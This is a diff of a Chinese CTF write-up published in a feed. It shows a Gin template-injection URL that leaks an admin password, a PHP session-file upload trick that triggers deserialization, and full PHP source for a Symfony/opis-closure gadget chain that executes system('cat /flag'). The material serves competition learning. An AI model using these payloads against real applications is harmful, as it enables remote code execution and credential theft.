@@ -17,8 +17,8 @@
 第二步是 gin 的模板注入，让 id 为一个不存在的值，age 为 {{.Password}} 就可以获得 admin 结构体中的 Password 变量值了。
 http://124.71.166.197:18001/admin/index?id=5&amp;amp;age={{.Password}}
 Upload_it 可以任意上传 /tmp 目录下文件， 可以直接写进 session 文件。查看 phpinfo 发现 session 的处理器是 php，于是可以把 upload_path|$serialize 写进 /tmp/sess_or4nge，然后改自己的 session_id 为 or4nge，即可触发反序列化。
-利用给的Composer.json：
-&amp;#34;symfony/string&amp;#34;: &amp;#34;^5.3&amp;#34;, &amp;#34;opis/closure&amp;#34;: &amp;#34;^3.6&amp;#34; 结合出题人发布的文章https://www.anquanke.com/post/id/217929#h2-3找到一条链，其中lazystring的任意无参数函数调用接的是闭包函数 __invoke，可以将闭包函数序列化进去。
+利用给的 Composer.json：
+&amp;#34;symfony/string&amp;#34;: &amp;#34;^5.3&amp;#34;, &amp;#34;opis/closure&amp;#34;: &amp;#34;^3.6&amp;#34; 结合出题人发布的文章 https://www.anquanke.com/post/id/217929#h2-3 找到一条链，其中 lazystring 的任意无参数函数调用接的是闭包函数 __invoke，可以将闭包函数序列化进去。
 &amp;lt;?php namespace Symfony\Component\String{ require &amp;#34;path\to\autoload.php&amp;#34;; class LazyString{ private $value; public function __construct() { $func = function(){system(&amp;#34;cat /flag&amp;#34;);}; $d = new \Opis\Closure\SerializableClosure($func); $this-&amp;gt;value = $d; } } class UnicodeString{ protected $string = &amp;#39;&amp;#39;; public function __construct() { $this-&amp;gt;string=new LazyString; } } } namespace { $exp=print(urlencode(serialize(new Symfony\Component\String\UnicodeString()))); } 其实这条链本地没有打通，原因是因为在 UnicodeString.</description>
     </item>
     
